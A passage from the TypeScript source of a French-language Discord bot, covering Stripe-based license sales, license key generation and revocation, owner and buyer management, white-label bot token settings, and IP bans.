    const durationText = duration ? `${duration} jours` : (plan === 'lifetime' ? 'Illimitée' : '30 jours');

    return ephemeral('', [{
      title: '🔑 Nouvelle Licence Générée',
      description: 'Voici votre nouvelle clé de licence :',
      color: 0xFFD700,
      fields: [
        { name: '🔐 Clé', value: `\`\`\`${newKey}\`\`\``, inline: false },
        { name: '📦 Plan', value: plan.charAt(0).toUpperCase() + plan.slice(1), inline: true },
        { name: '⏰ Durée', value: durationText, inline: true }
      ],
      footer: { text: '⚠️ Conservez cette clé en lieu sûr !' }
    }]);
  }

  return ephemeral('❌ Action inconnue.');
}

// Check license before executing buyer commands
async function requireLicense(supabase: any, guildId: string): Promise<Response | null> {
  const { valid } = await hasValidLicense(supabase, guildId);
  if (!valid) {
    return ephemeral('', [{
      title: '🔒 Licence Requise',
      description: 'Ce serveur n\'a pas de licence active pour utiliser cette commande.',
      color: 0xEF4444,
      fields: [
        { name: '💡 Comment obtenir une licence ?', value: 'Utilisez `/license info` pour plus d\'informations.', inline: false }
      ]
    }]);
  }
  return null; // License is valid
}

// ===== PAYMENT/BUY COMMANDS =====

// Stripe price IDs
const STRIPE_PRICES = {
  standard: { id: 'price_1Sw3dmDv7QD9qcNwvYNM7S6W', name: 'Standard', duration: '30 jours', price: '5€' },
  premium: { id: 'price_1Sw3dxDv7QD9qcNwFVEfI5Yi', name: 'Premium', duration: '90 jours', price: '12€' },
  lifetime: { id: 'price_1Sw3e8Dv7QD9qcNwL9lGVGas', name: 'Lifetime', duration: 'À vie', price: '25€' }
};

// Buy command - create Stripe payment links
async function handleBuy(interaction: any, _supabase: any) {
  const stripeKey = Deno.env.get('STRIPE_SECRET_KEY');
  const plan = getOption(interaction.data.options, 'plan') as string || 'standard';
  const userId = interaction.member.user.id;

  if (!stripeKey) {
    return ephemeral('', [{
      title: '❌ Paiement non configuré',
      description: 'Le système de paiement n\'est pas encore configuré.\nContactez le propriétaire du bot.',
      color: 0xEF4444
    }]);
  }

  const selectedPlan = STRIPE_PRICES[plan as keyof typeof STRIPE_PRICES];
  if (!selectedPlan) {
    return ephemeral('❌ Plan invalide. Choisissez: standard, premium, ou lifetime');
  }

  try {
    const stripe = new Stripe(stripeKey, { apiVersion: "2025-08-27.basil" });

    // Create checkout session
    const session = await stripe.checkout.sessions.create({
      line_items: [{ price: selectedPlan.id, quantity: 1 }],
      mode: 'payment',
      success_url: 'https://discord.com/channels/@me?payment=success',
      cancel_url: 'https://discord.com/channels/@me?payment=cancelled',
      metadata: { discord_user_id: userId, plan_type: plan }
    });

    return ephemeral('', [{
      title: '🛒 Acheter une Licence',
      description: `Tu as choisi le plan **${selectedPlan.name}** (${selectedPlan.duration}).`,
      color: 0x635BFF,
      fields: [
        { name: '💰 Prix', value: selectedPlan.price, inline: true },
        { name: '⏰ Durée', value: selectedPlan.duration, inline: true },
        { name: '\u200B', value: '━━━━━━━━━━━━━━━━━━━━━━━', inline: false },
        { name: '🔗 Lien de paiement', value: `**[Cliquez ici pour payer](${session.url})**`, inline: false },
        { name: '\u200B', value: '━━━━━━━━━━━━━━━━━━━━━━━', inline: false },
        { name: '✨ Après paiement', value: 
          '1️⃣ Tu recevras ta clé automatiquement par DM\n' +
          '2️⃣ Utilise `/license activate key:TA-CLÉ` sur ton serveur\n' +
          '3️⃣ Profite du bot !', inline: false }
      ],
      footer: { text: '🔒 Paiement sécurisé par Stripe' }
    }]);
  } catch (error) {
    console.error('Stripe error:', error);
    return ephemeral('❌ Erreur lors de la création du paiement. Réessayez plus tard.');
  }
}

// Redeem command - owner validates payment and sends license (CRÉATEUR ONLY)
async function handleRedeem(interaction: any, supabase: any) {
  const modId = interaction.member?.user?.id || interaction.user?.id;
  
  // Only creators can use redeem
  if (!isCreateur(modId)) {
    return ephemeral(`❌ Cette commande est réservée aux créateurs du bot.`);
  }

  const userId = getOption(interaction.data.options, 'user') as string;
  const plan = getOption(interaction.data.options, 'plan') as string;

  // Generate license key
  const newKey = generateLicenseKey();
  const durationDays = plan === 'lifetime' ? null : (plan === 'premium' ? 90 : 30);

  // Insert into valid_licenses
  const { error } = await supabase.from('valid_licenses').insert({
    license_key: newKey,
    plan_type: plan,
    duration_days: durationDays
  });

  if (error) {
    console.error('Redeem error:', error);
    return ephemeral('❌ Erreur lors de la génération de la licence.');
  }

  // Try to DM the user
  try {
    // Create DM channel
    const dmRes = await discordFetch('/users/@me/channels', {
      method: 'POST',
      body: JSON.stringify({ recipient_id: userId })
    });
    const dmChannel = await dmRes.json();

    if (dmChannel.id) {
      // Send the license key
      const durationText = durationDays ? `${durationDays} jours` : 'À vie';
      await discordFetch(`/channels/${dmChannel.id}/messages`, {
        method: 'POST',
        body: JSON.stringify({
          embeds: [{
            title: '🎉 Votre Licence est prête !',
            description: 'Merci pour votre achat ! Voici votre clé de licence :',
            color: 0x22C55E,
            fields: [
              { name: '🔐 Clé de Licence', value: `\`\`\`${newKey}\`\`\``, inline: false },
              { name: '📦 Plan', value: plan.charAt(0).toUpperCase() + plan.slice(1), inline: true },
              { name: '⏰ Durée', value: durationText, inline: true },
              { name: '\u200B', value: '━━━━━━━━━━━━━━━━━━━━━━━', inline: false },
              { name: '📝 Comment activer ?', value: 
                '1️⃣ Allez sur votre serveur Discord\n' +
                '2️⃣ Tapez `/license activate key:' + newKey + '`\n' +
                '3️⃣ Profitez du bot !', inline: false }
            ],
            footer: { text: '⚠️ Conservez cette clé en lieu sûr !' }
          }]
        })
      });
    }
  } catch (e) {
    console.error('Failed to DM user:', e);
  }

  const durationText = durationDays ? `${durationDays} jours` : 'À vie';
  return publicMsg('', [{
    title: '✅ Licence envoyée !',
    description: `La licence a été générée et envoyée à <@${userId}>.`,
    color: 0x22C55E,
    fields: [
      { name: '🔐 Clé', value: `\`\`\`${newKey}\`\`\``, inline: false },
      { name: '📦 Plan', value: plan.charAt(0).toUpperCase() + plan.slice(1), inline: true },
      { name: '⏰ Durée', value: durationText, inline: true }
    ]
  }]);
}

// Set PayPal config (CRÉATEUR ONLY)
async function handleSetPaypal(interaction: any, supabase: any) {
  const modId = interaction.member?.user?.id || interaction.user?.id;
  
  // Only creators can configure payment settings
  if (!isCreateur(modId)) {
    return ephemeral(`❌ Cette commande est réservée aux créateurs du bot.`);
  }

  const email = getOption(interaction.data.options, 'email') as string;
  const priceStandard = getOption(interaction.data.options, 'price_standard') as string | undefined;
  const pricePremium = getOption(interaction.data.options, 'price_premium') as string | undefined;
  const priceLifetime = getOption(interaction.data.options, 'price_lifetime') as string | undefined;

  const updateData: any = { 
    paypal_email: email,
    updated_at: new Date().toISOString()
  };
  if (priceStandard) updateData.price_standard = priceStandard;
  if (pricePremium) updateData.price_premium = pricePremium;
  if (priceLifetime) updateData.price_lifetime = priceLifetime;

  const { error } = await supabase
    .from('payment_config')
    .upsert({ id: 'main', ...updateData });

  if (error) {
    console.error('SetPaypal error:', error);
    return ephemeral('❌ Erreur lors de la configuration.');
  }

  return ephemeral('', [{
    title: '✅ Configuration PayPal mise à jour',
    color: 0x22C55E,
    fields: [
      { name: '📧 Email', value: email, inline: true },
      ...(priceStandard ? [{ name: '📦 Standard', value: priceStandard, inline: true }] : []),
      ...(pricePremium ? [{ name: '⭐ Premium', value: pricePremium, inline: true }] : []),
      ...(priceLifetime ? [{ name: '💎 Lifetime', value: priceLifetime, inline: true }] : [])
    ]
  }]);
}

// Set Litecoin address (CRÉATEUR ONLY)
async function handleSetLtc(interaction: any, supabase: any) {
  const modId = interaction.member?.user?.id || interaction.user?.id;
  
  // Only creators can configure payment settings
  if (!isCreateur(modId)) {
    return ephemeral(`❌ Cette commande est réservée aux créateurs du bot.`);
  }

  const address = getOption(interaction.data.options, 'address') as string;

  if (!address || address.length < 20) {
    return ephemeral('❌ Adresse Litecoin invalide.');
  }

  const { error } = await supabase
    .from('payment_config')
    .upsert({ 
      id: 'main', 
      ltc_address: address,
      updated_at: new Date().toISOString()
    });

  if (error) {
    console.error('SetLtc error:', error);
    return ephemeral('❌ Erreur lors de la configuration.');
  }

  return ephemeral('', [{
    title: '✅ Adresse Litecoin configurée',
    color: 0x22C55E,
    fields: [
      { name: '💰 Adresse LTC', value: `\`${address}\``, inline: false }
    ]
  }]);
}

// ===== OWNER/BUYER COMMANDS =====

// Buyer command - list or add buyers
async function handleBuyer(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const modId = interaction.member.user.id;
  const targetId = getOption(interaction.data.options, 'membre') as string | undefined;

  if (!targetId) {
    // List buyers
    const { data: buyers } = await supabase
      .from('bot_buyers')
      .select('*')
      .eq('guild_id', guildId)
      .order('created_at', { ascending: false });

    if (!buyers || buyers.length === 0) {
      return ephemeral(`📋 Aucun buyer configuré sur ce serveur.`);
    }

    const buyerList = buyers.map((b: any, i: number) => {
      const date = new Date(b.created_at).toLocaleDateString('fr-FR');
      return `**${i + 1}.** <@${b.user_id}> - Ajouté le ${date}`;
    }).join('\n');

    return ephemeral('', [{
      title: '👑 Liste des Buyers',
      description: buyerList,
      color: 0xFFD700,
      footer: { text: `Total: ${buyers.length} buyer(s)` }
    }]);
  }

  // Add buyer
  const { error } = await supabase.from('bot_buyers').insert({
    guild_id: guildId,
    user_id: targetId,
    added_by: modId
  });

  if (error && error.code === '23505') {
    return ephemeral(`❌ <@${targetId}> est déjà un buyer.`);
  }

  return publicMsg(`✅ <@${targetId}> a été ajouté comme buyer.`);
}

// Unbuyer command
async function handleUnbuyer(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const targetId = getOption(interaction.data.options, 'membre') as string;

  const { data, error } = await supabase
    .from('bot_buyers')
    .delete()
    .eq('guild_id', guildId)
    .eq('user_id', targetId)
    .select();

  if (!data || data.length === 0) {
    return ephemeral(`❌ <@${targetId}> n'est pas un buyer.`);
  }

  return publicMsg(`✅ <@${targetId}> a été retiré des buyers.`);
}

// Change command - enable/disable commands
async function handleChange(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const modId = interaction.member.user.id;
  const commandName = (getOption(interaction.data.options, 'commande') as string).toLowerCase();
  const state = getOption(interaction.data.options, 'etat') as string;

  // Protected commands that cannot be disabled
  const protectedCommands = ['help', 'buyer', 'unbuyer', 'change', 'listoff', 'settings'];
  if (protectedCommands.includes(commandName)) {
    return ephemeral(`❌ La commande \`${commandName}\` ne peut pas être désactivée.`);
  }

  if (state === 'off') {
    // Disable command
    const { error } = await supabase.from('disabled_commands').insert({
      guild_id: guildId,
      command_name: commandName,
      disabled_by: modId
    });

    if (error && error.code === '23505') {
      return ephemeral(`❌ La commande \`${commandName}\` est déjà désactivée.`);
    }

    return publicMsg(`🔴 La commande \`/${commandName}\` a été **désactivée**.`);
  } else {
    // Enable command
    const { data } = await supabase
      .from('disabled_commands')
      .delete()
      .eq('guild_id', guildId)
      .eq('command_name', commandName)
      .select();

    if (!data || data.length === 0) {
      return ephemeral(`❌ La commande \`${commandName}\` n'est pas désactivée.`);
    }

    return publicMsg(`🟢 La commande \`/${commandName}\` a été **activée**.`);
  }
}

// Listoff command - list disabled commands
async function handleListoff(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;

  const { data: disabled } = await supabase
    .from('disabled_commands')
    .select('*')
    .eq('guild_id', guildId)
    .order('created_at', { ascending: false });

  if (!disabled || disabled.length === 0) {
    return ephemeral(`✅ Aucune commande désactivée sur ce serveur.`);
  }

  const list = disabled.map((d: any, i: number) => {
    const date = new Date(d.created_at).toLocaleDateString('fr-FR');
    return `**${i + 1}.** \`/${d.command_name}\` - Désactivée le ${date}`;
  }).join('\n');

  return ephemeral('', [{
    title: '🔴 Commandes Désactivées',
    description: list,
    color: 0xEF4444,
    footer: { text: `Total: ${disabled.length} commande(s) désactivée(s)` }
  }]);
}

// Owner command - list or add owners
async function handleSetowner(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const modId = interaction.member.user.id;
  const targetId = getOption(interaction.data.options, 'membre') as string | undefined;

  // Get guild info to check if user is the actual server owner
  const guildRes = await discordFetch(`/guilds/${guildId}`);
  const guild = await guildRes.json();
  
  if (guild.owner_id !== modId) {
    return ephemeral(`❌ Seul le propriétaire du serveur peut utiliser cette commande.`);
  }

  if (!targetId) {
    // List owners
    const { data: owners } = await supabase
      .from('bot_owners')
      .select('*')
      .eq('guild_id', guildId)
      .order('created_at', { ascending: false });

    if (!owners || owners.length === 0) {
      return ephemeral(`📋 Aucun owner configuré sur ce serveur.\nLe propriétaire du serveur (<@${guild.owner_id}>) a automatiquement les permissions owner.`);
    }

    const ownerList = owners.map((o: any, i: number) => {
      const date = new Date(o.created_at).toLocaleDateString('fr-FR');
      return `**${i + 1}.** <@${o.user_id}> - Ajouté le ${date}`;
    }).join('\n');

    return ephemeral('', [{
      title: '👑 Liste des Owners',
      description: `**Propriétaire du serveur:** <@${guild.owner_id}>\n\n${ownerList}`,
      color: 0xFFD700,
      footer: { text: `Total: ${owners.length} owner(s) supplémentaire(s)` }
    }]);
  }

  // Add owner
  const { error } = await supabase.from('bot_owners').insert({
    guild_id: guildId,
    user_id: targetId,
    added_by: modId
  });

  if (error && error.code === '23505') {
    return ephemeral(`❌ <@${targetId}> est déjà un owner.`);
  }

  return publicMsg(`✅ <@${targetId}> a été ajouté comme **owner** du bot.`);
}

// Delowner command
async function handleDelowner(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const modId = interaction.member.user.id;
  const targetId = getOption(interaction.data.options, 'membre') as string;

  // Get guild info to check if user is the actual server owner
  const guildRes = await discordFetch(`/guilds/${guildId}`);
  const guild = await guildRes.json();
  
  if (guild.owner_id !== modId) {
    return ephemeral(`❌ Seul le propriétaire du serveur peut utiliser cette commande.`);
  }

  const { data, error } = await supabase
    .from('bot_owners')
    .delete()
    .eq('guild_id', guildId)
    .eq('user_id', targetId)
    .select();

  if (!data || data.length === 0) {
    return ephemeral(`❌ <@${targetId}> n'est pas un owner.`);
  }

  return publicMsg(`✅ <@${targetId}> a été retiré des owners.`);
}

// ===== WHITE-LABEL COMMANDS =====

// Set bot token for white-label
async function handleSetToken(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const userId = interaction.member?.user?.id;

  // Get guild to check ownership
  const guildRes = await discordFetch(`/guilds/${guildId}`);
  const guild = await guildRes.json();

  // Only guild owner or créateurs can set token
  if (guild.owner_id !== userId && !isCreateur(userId)) {
    return ephemeral(`❌ Seul le propriétaire du serveur peut configurer le bot white-label.`);
  }

  const token = getOption(interaction.data.options, 'token') as string;
  const appId = getOption(interaction.data.options, 'app_id') as string;
  const publicKey = getOption(interaction.data.options, 'public_key') as string | undefined;

  // Try to validate the token by fetching bot info
  try {
    const testRes = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { 'Authorization': `Bot ${token}` }
    });

    if (!testRes.ok) {
      return ephemeral(`❌ Token invalide. Vérifie que le token est correct.`);
    }

    const botUser = await testRes.json();

    // Save to database
    await supabase.from('guild_bot_config').upsert({
      guild_id: guildId,
      bot_token: token,
      bot_application_id: appId,
      bot_public_key: publicKey || null,
      bot_name: botUser.username,
      configured_by: userId,
      updated_at: new Date().toISOString()
    }, { onConflict: 'guild_id' });

    return ephemeral('', [{
      title: '✅ Bot White-Label Configuré',
      description: `Le bot **${botUser.username}** est maintenant configuré pour ce serveur !`,
      color: 0x22C55E,
      fields: [
        { name: '📛 Nom', value: botUser.username, inline: true },
        { name: '🆔 ID', value: botUser.id, inline: true },
        { name: '📋 App ID', value: appId, inline: true }
      ],
      footer: { text: '⚠️ Note: Le white-label complet nécessite un hébergement VPS' }
    }]);
  } catch (error) {
    return ephemeral(`❌ Erreur lors de la validation du token.`);
  }
}

// Remove white-label config
async function handleRemoveToken(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const userId = interaction.member?.user?.id;

  // Get guild to check ownership
  const guildRes = await discordFetch(`/guilds/${guildId}`);
  const guild = await guildRes.json();

  // Only guild owner or créateurs can remove token
  if (guild.owner_id !== userId && !isCreateur(userId)) {
    return ephemeral(`❌ Seul le propriétaire du serveur peut supprimer la configuration white-label.`);
  }

  const { data: existing } = await supabase
    .from('guild_bot_config')
    .select('bot_name')
    .eq('guild_id', guildId)
    .single();

  if (!existing) {
    return ephemeral(`❌ Aucune configuration white-label trouvée pour ce serveur.`);
  }

  await supabase
    .from('guild_bot_config')
    .delete()
    .eq('guild_id', guildId);

  return ephemeral(`✅ Configuration white-label supprimée. Le bot principal sera utilisé.`);
}

// ===== CRÉATEUR COMMANDS =====

// List all owners across all guilds (créateur only)
async function handleListAllOwners(interaction: any, supabase: any) {
  const modId = interaction.member?.user?.id || interaction.user?.id;
  
  if (!isCreateur(modId)) {
    return ephemeral(`❌ Cette commande est réservée aux créateurs du bot.`);
  }

  const guildId = getOption(interaction.data.options, 'guild_id') as string | undefined;

  if (guildId) {
    // Get owners for a specific guild
    const { data: owners } = await supabase
      .from('bot_owners')
      .select('*')
      .eq('guild_id', guildId)
      .order('created_at', { ascending: false });

    if (!owners || owners.length === 0) {
      return ephemeral(`📋 Aucun owner configuré pour ce serveur.`);
    }

    const ownerList = owners.map((o: any, i: number) => {
      const date = new Date(o.created_at).toLocaleDateString('fr-FR');
      return `**${i + 1}.** <@${o.user_id}> - Ajouté par <@${o.added_by}> le ${date}`;
    }).join('\n');

    return ephemeral('', [{
      title: `👑 Owners du serveur`,
      description: ownerList,
      color: 0xFFD700,
      footer: { text: `Guild ID: ${guildId} | Total: ${owners.length}` }
    }]);
  }

  // Get all owners grouped by guild
  const { data: allOwners } = await supabase
    .from('bot_owners')
    .select('*')
    .order('guild_id', { ascending: true })
    .order('created_at', { ascending: false });

  if (!allOwners || allOwners.length === 0) {
    return ephemeral(`📋 Aucun owner configuré sur aucun serveur.`);
  }

  // Group by guild
  const grouped: Record<string, any[]> = {};
  for (const o of allOwners) {
    if (!grouped[o.guild_id]) grouped[o.guild_id] = [];
    grouped[o.guild_id].push(o);
  }

  const description = Object.entries(grouped).map(([guildId, owners]) => {
    const ownerMentions = owners.map((o: any) => `<@${o.user_id}>`).join(', ');
    return `**Guild \`${guildId}\`:**\n${ownerMentions}`;
  }).join('\n\n').slice(0, 4000);

  return ephemeral('', [{
    title: `👑 Tous les Owners`,
    description,
    color: 0xFFD700,
    footer: { text: `Total: ${allOwners.length} owner(s) sur ${Object.keys(grouped).length} serveur(s)` }
  }]);
}

// List all buyers across all guilds (créateur only)
async function handleListAllBuyers(interaction: any, supabase: any) {
  const modId = interaction.member?.user?.id || interaction.user?.id;
  
  if (!isCreateur(modId)) {
    return ephemeral(`❌ Cette commande est réservée aux créateurs du bot.`);
  }

  const guildId = getOption(interaction.data.options, 'guild_id') as string | undefined;

  if (guildId) {
    // Get buyers for a specific guild
    const { data: buyers } = await supabase
      .from('bot_buyers')
      .select('*')
      .eq('guild_id', guildId)
      .order('created_at', { ascending: false });

    if (!buyers || buyers.length === 0) {
      return ephemeral(`📋 Aucun buyer configuré pour ce serveur.`);
    }

    const buyerList = buyers.map((b: any, i: number) => {
      const date = new Date(b.created_at).toLocaleDateString('fr-FR');
      return `**${i + 1}.** <@${b.user_id}> - Ajouté par <@${b.added_by}> le ${date}`;
    }).join('\n');

    return ephemeral('', [{
      title: `💎 Buyers du serveur`,
      description: buyerList,
      color: 0x3B82F6,
      footer: { text: `Guild ID: ${guildId} | Total: ${buyers.length}` }
    }]);
  }

  // Get all buyers grouped by guild
  const { data: allBuyers } = await supabase
    .from('bot_buyers')
    .select('*')
    .order('guild_id', { ascending: true })
    .order('created_at', { ascending: false });

  if (!allBuyers || allBuyers.length === 0) {
    return ephemeral(`📋 Aucun buyer configuré sur aucun serveur.`);
  }

  // Group by guild
  const grouped: Record<string, any[]> = {};
  for (const b of allBuyers) {
    if (!grouped[b.guild_id]) grouped[b.guild_id] = [];
    grouped[b.guild_id].push(b);
  }

  const description = Object.entries(grouped).map(([guildId, buyers]) => {
    const buyerMentions = buyers.map((b: any) => `<@${b.user_id}>`).join(', ');
    return `**Guild \`${guildId}\`:**\n${buyerMentions}`;
  }).join('\n\n').slice(0, 4000);

  return ephemeral('', [{
    title: `💎 Tous les Buyers`,
    description,
    color: 0x3B82F6,
    footer: { text: `Total: ${allBuyers.length} buyer(s) sur ${Object.keys(grouped).length} serveur(s)` }
  }]);
}

// Revoke a license (créateur only)
async function handleRevoke(interaction: any, supabase: any) {
  const modId = interaction.member?.user?.id || interaction.user?.id;
  
  if (!isCreateur(modId)) {
    return ephemeral(`❌ Cette commande est réservée aux créateurs du bot.`);
  }

  const guildId = getOption(interaction.data.options, 'guild_id') as string;
  const reason = getOption(interaction.data.options, 'raison') as string || 'Aucune raison spécifiée';

  // Get license info
  const { data: license } = await supabase
    .from('bot_licenses')
    .select('*')
    .eq('guild_id', guildId)
    .eq('is_active', true)
    .single();

  if (!license) {
    return ephemeral(`❌ Aucune licence active trouvée pour le serveur \`${guildId}\`.`);
  }

  // Deactivate the license
  const { error } = await supabase
    .from('bot_licenses')
    .update({ is_active: false })
    .eq('id', license.id);

  if (error) {
    console.error('Revoke error:', error);
    return ephemeral(`❌ Erreur lors de la révocation.`);
  }

  return ephemeral('', [{
    title: '🔴 Licence Révoquée',
    color: 0xEF4444,
    fields: [
      { name: '🏠 Serveur', value: `\`${guildId}\``, inline: true },
      { name: '📦 Plan', value: license.plan_type, inline: true },
      { name: '👤 Activée par', value: `<@${license.activated_by}>`, inline: true },
      { name: '📝 Raison', value: reason, inline: false },
      { name: '🔑 Clé', value: `\`${license.license_key}\``, inline: false }
    ],
    footer: { text: `Révoquée par un créateur` },
    timestamp: new Date().toISOString()
  }]);
}

// Create a license manually (créateur only)
async function handleCreateLicense(interaction: any, supabase: any) {
  const modId = interaction.member?.user?.id || interaction.user?.id;
  
  if (!isCreateur(modId)) {
    return ephemeral(`❌ Cette commande est réservée aux créateurs du bot.`);
  }

  const plan = (getOption(interaction.data.options, 'plan') as string) || 'standard';
  const durationDays = getOption(interaction.data.options, 'duree') as number | undefined;
  const userId = getOption(interaction.data.options, 'user') as string | undefined;

  // Default durations
  const defaultDurations: Record<string, number | null> = {
    standard: 30,
    premium: 90,
    lifetime: null
  };

  const finalDuration = plan === 'lifetime' ? null : (durationDays || defaultDurations[plan]);

  // Generate license key
  const newKey = `PB-${plan.toUpperCase()}-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;

  // Insert in valid_licenses
  const { error } = await supabase.from('valid_licenses').insert({
    license_key: newKey,
    plan_type: plan,
    duration_days: finalDuration,
    redeemed: false
  });

  if (error) {
    console.error('Create license error:', error);
    return ephemeral(`❌ Erreur lors de la création de la licence.`);
  }

  // If user specified, send DM
  if (userId) {
    try {
      const dmRes = await discordFetch('/users/@me/channels', {
        method: 'POST',
        body: JSON.stringify({ recipient_id: userId })
      });
      const dmChannel = await dmRes.json();

      if (dmChannel.id) {
        const durationText = finalDuration ? `${finalDuration} jours` : 'À vie';
        await discordFetch(`/channels/${dmChannel.id}/messages`, {
          method: 'POST',
          body: JSON.stringify({
            embeds: [{
              title: '🎉 Votre Licence est prête !',
              description: 'Une licence vous a été attribuée par un administrateur.',
              color: 0x22C55E,
              fields: [
                { name: '🔐 Clé de Licence', value: `\`\`\`${newKey}\`\`\``, inline: false },
                { name: '📦 Plan', value: plan.charAt(0).toUpperCase() + plan.slice(1), inline: true },
                { name: '⏰ Durée', value: durationText, inline: true },
                { name: '\u200B', value: '━━━━━━━━━━━━━━━━━━━━━━━', inline: false },
                { name: '📝 Comment activer ?', value: 
                  '1️⃣ Allez sur votre serveur Discord\n' +
                  '2️⃣ Tapez `/license activate key:' + newKey + '`\n' +
                  '3️⃣ Profitez du bot !', inline: false }
              ],
              footer: { text: '⚠️ Conservez cette clé en lieu sûr !' }
            }]
          })
        });
      }
    } catch (e) {
      console.error('Failed to DM user:', e);
    }
  }

  const durationText = finalDuration ? `${finalDuration} jours` : 'À vie';
  return ephemeral('', [{
    title: '✅ Licence Créée',
    color: 0x22C55E,
    fields: [
      { name: '🔐 Clé', value: `\`\`\`${newKey}\`\`\``, inline: false },
      { name: '📦 Plan', value: plan.charAt(0).toUpperCase() + plan.slice(1), inline: true },
      { name: '⏰ Durée', value: durationText, inline: true },
      ...(userId ? [{ name: '📨 Envoyée à', value: `<@${userId}>`, inline: true }] : [])
    ],
    footer: { text: 'Créée par un créateur' }
  }]);
}

// List all licenses (créateur only)
async function handleListLicenses(interaction: any, supabase: any) {
  const modId = interaction.member?.user?.id || interaction.user?.id;
  
  if (!isCreateur(modId)) {
    return ephemeral(`❌ Cette commande est réservée aux créateurs du bot.`);
  }

  const filter = getOption(interaction.data.options, 'filtre') as string | undefined;

  let query = supabase.from('bot_licenses').select('*').order('activated_at', { ascending: false });
  
  if (filter === 'active') {
    query = query.eq('is_active', true);
  } else if (filter === 'expired') {
    query = query.eq('is_active', false);
  }

  const { data: licenses } = await query.limit(25);

  if (!licenses || licenses.length === 0) {
    return ephemeral(`📋 Aucune licence trouvée.`);
  }

  const licenseList = licenses.map((l: any, i: number) => {
    const date = new Date(l.activated_at).toLocaleDateString('fr-FR');
    const status = l.is_active ? '🟢' : '🔴';
    const expiresAt = l.expires_at ? new Date(l.expires_at).toLocaleDateString('fr-FR') : 'Jamais';
    return `${status} **${l.plan_type}** - Guild: \`${l.guild_id.slice(0, 10)}...\`\n   └ Activée: ${date} | Expire: ${expiresAt}`;
  }).join('\n\n').slice(0, 4000);

  return ephemeral('', [{
    title: '📋 Licences',
    description: licenseList,
    color: 0x3B82F6,
    footer: { text: `Affichage des 25 dernières licences` }
  }]);
}

// Ban IP (créateur only)
async function handleBanIp(interaction: any, supabase: any) {
  const modId = interaction.member?.user?.id || interaction.user?.id;
  
  if (!isCreateur(modId)) {
    return ephemeral(`❌ Cette commande est réservée aux créateurs du bot.`);
  }

  const ip = getOption(interaction.data.options, 'ip') as string;
  const reason = getOption(interaction.data.options, 'raison') as string || 'Aucune raison';

  if (!ip) {
    return ephemeral(`❌ Veuillez fournir une adresse IP.`);
  }

  // Check if already banned
  const { data: existing } = await supabase
    .from('banned_ips')
    .select('id')
    .eq('ip_address', ip)
    .maybeSingle();

  if (existing) {
    return ephemeral(`❌ Cette IP est déjà bannie.`);
  }

  const { error } = await supabase.from('banned_ips').insert({
    ip_address: ip,
    reason,
    banned_by: modId
  });

  if (error) {
    console.error('Ban IP error:', error);
    return ephemeral(`❌ Erreur lors du ban de l'IP.`);
  }

  return ephemeral('', [{
    title: '🚫 IP Bannie',
    color: 0xEF4444,
    fields: [
      { name: '🌐 Adresse IP', value: `\`${ip}\``, inline: true },
      { name: '📝 Raison', value: reason, inline: true }
    ]
  }]);
}

// Unban IP (créateur only)
async function handleUnbanIp(interaction: any, supabase: any) {
  const modId = interaction.member?.user?.id || interaction.user?.id;
  
  if (!isCreateur(modId)) {
    return ephemeral(`❌ Cette commande est réservée aux créateurs du bot.`);
  }

  const ip = getOption(interaction.data.options, 'ip') as string;

  if (!ip) {
    return ephemeral(`❌ Veuillez fournir une adresse IP.`);
  }

  const { error } = await supabase
    .from('banned_ips')
    .delete()
    .eq('ip_address', ip);

  if (error) {
    console.error('Unban IP error:', error);
    return ephemeral(`❌ Erreur lors du déban de l'IP.`);
  }

  return ephemeral(`✅ L'IP \`${ip}\` a été débannie.`);
}

// List banned IPs (créateur only)
async function handleListBannedIps(interaction: any, supabase: any) {
  const modId = interaction.member?.user?.id || interaction.user?.id;
  
  if (!isCreateur(modId)) {
    return ephemeral(`❌ Cette commande est réservée aux créateurs du bot.`);
  }

  const { data: bannedIps } = await supabase
    .from('banned_ips')
    .select('*')
    .order('created_at', { ascending: false })
    .limit(25);

  if (!bannedIps || bannedIps.length === 0) {
    return ephemeral(`📋 Aucune IP bannie.`);
  }

  const ipList = bannedIps.map((ip: any, i: number) => {
    const date = new Date(ip.created_at).toLocaleDateString('fr-FR');
    return `**${i + 1}.** \`${ip.ip_address}\`\n   └ Raison: ${ip.reason || 'Aucune'} | ${date}`;
  }).join('\n\n').slice(0, 4000);

  return ephemeral('', [{
    title: '🚫 IPs Bannies',
    description: ipList,
    color: 0xEF4444,
    footer: { text: `Total: ${bannedIps.length} IP(s) bannie(s)` }
  }]);
}

// Check if user is owner (server owner or added as bot owner)
async function isOwner(supabase: any, guildId: string, userId: string): Promise<boolean> {
  // Check if server owner
  const guildRes = await discordFetch(`/guilds/${guildId}`);
  const guild = await guildRes.json();
  
  if (guild.owner_id === userId) {
    return true;
  }
  
  // Check if added as bot owner
  const { data } = await supabase
    .from('bot_owners')
    .select('id')
    .eq('guild_id', guildId)
    .eq('user_id', userId)
    .single();
  
  return !!data;
}

// Check if command is disabled
async function isCommandDisabled(supabase: any, guildId: string, commandName: string): Promise<boolean> {
  const { data } = await supabase
    .from('disabled_commands')
    .select('id')
    .eq('guild_id', guildId)
    .eq('command_name', commandName)
    .single();
  
  return !!data;
}

// ===== ADVANCED CONFIG COMMANDS =====

// Counter command
async function handleCounter(interaction: any, supabase: any) {
  const guildId = interaction.guild_id;
  const action = getOption(interaction.data.options, 'action') as string;
  const channelId = getOption(interaction.data.options, 'salon') as string;
  const counterType = getOption(interaction.data.options, 'type') as string || 'members';

  if (action === 'view') {
    const { data: counters } = await supabase
      .from('counters')
      .select('*')
      .eq('guild_id', guildId);

    if (!counters || counters.length === 0) {
      return ephemeral(`📊 Aucun compteur configuré.`);
    }

    const list = counters.map((c: any, i: number) => 
      `**${i + 1}.** <#${c.channel_id}> - Type: \`${c.counter_type}\``
    ).join('\n');

    return ephemeral('', [{
      title: '📊 Compteurs du serveur',
      description: list,
      color: 0x3B82F6
    }]);
  }

  if (action === 'create') {
    if (!channelId) {
      return ephemeral(`❌ Veuillez spécifier un salon.`);
    }

    const { error } = await supabase.from('counters').insert({
